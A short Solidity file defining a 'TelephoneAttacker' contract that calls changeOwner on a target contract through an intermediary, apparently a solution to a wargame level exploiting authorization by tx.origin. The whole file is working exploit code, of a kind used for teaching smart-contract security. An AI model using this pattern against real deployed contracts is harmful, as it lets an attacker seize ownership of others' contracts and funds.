// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttacker {

  address telephone;

  constructor(address _telephone) public {
    telephone = _telephone;
  }

  function attack() public {
    ITelephone(telephone).changeOwner(msg.sender);
  }
  
}